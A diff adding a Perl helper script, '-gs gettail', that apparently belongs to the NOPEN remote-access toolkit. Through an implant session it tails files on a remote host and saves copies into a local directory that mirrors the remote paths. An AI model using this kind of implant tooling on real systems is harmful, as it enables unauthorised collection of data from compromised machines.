@@ -1,0 +1,88 @@
+#!/usr/bin/env perl
+#
+# INPUT: $ARGV[] is several files to tail to screen and local file
+#
+$VER="2.0.0.1" ;
+myinit() ;
+foreach (@ARGV) {
+  s/^\s*//;
+  my $filename = $_;
+  my $destfile = "$_.tail" ;
+  if (/^\//) { # we got full path of remote file
+    my $remotedir = dirname($filename) ;
+    my $localdir = "$opdown/$nopen_rhostname$remotedir" ;
+    `mkdir -p $localdir` unless (-d $localdir);
+    $destfile = "$localdir/".basename($filename).".tail" ;
+  }
+  preservefile($destfile,"LOUD");
+  doit("-tail $linecount $filename > $dest:$destfile");
+  if ($popupoutput) {
+    filepopup($destfile,"-title \"gettail_${linecount}_$destfile\" -geometry 112x60+340+30");
+#    $destfile =~ s/\/current\/down\/// ;
+#    print OUT "-nohist -lsh cd $opdown ; [ -s $destfile ] && 1x -title \"gettail_${linecount}_$destfile\" -geometry 112x60+340+30 -e \"view $destfile\"\n" ;
+  }
+}
+#close(OUT);
+#rename($nextextfile,"$opetc/gs.gettailnext");
+# End with true value as we require this script elsewhere.
+1;
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs gettail @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs gettail";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+
+  $usagetext="
+Usage: $prog [-h]                    (prints this usage statement)
+       $prog [-p] [+/-N] file1 [ file2 ... ]
+
+  -p   pop up output in separate window
+  -l   Use L: instead of default T:, so tailed output not shown
+
+Run from within a NOPEN session, $prog calls autogettail which
+builds a NOGS to use -tail [+/-N] on one or more files, putting
+output both to the screen and to a local file with a \".tail\"
+extension (unless -p is used).
+
+The aliases \"-gt\" and \"-gettail\" are the same as \"-gs gettail\",
+and \"-vgt\" and \"-vgettail\" are the same as \"-gs gettail -p\".
+
+";
+  $linecount = "" ;
+  for ($i=0 ; $i < @ARGV ; ) {
+    if ($ARGV[$i] =~ /^[-+]\d+$/) {
+      $linecount = splice(@ARGV,$i,1) ;
+      next ;
+    }
+    $i++ ;
+  }
+  $nextextfile = "$opetc/gs.gettailnext.$ext";
+  unlink($nextextfile,"$opetc/gs.gettailnext") ;
+  mydie("bad option(s)") if (! Getopts( "hvpl" ) ) ;
+  $popupoutput = $opt_p ;
+  $dest = "T" ;
+  $dest = "L" if $popupoutput or $opt_l;
+#  open(OUT,"> $nextextfile") || 
+#      mydie("cannot open $nextextfile");
+#  print OUT "#NOGS\n";
+  usage() if ($opt_h or $opt_v or !@ARGV) ;
+
+  $socket = pilotstart(quiet);
+}#myinit
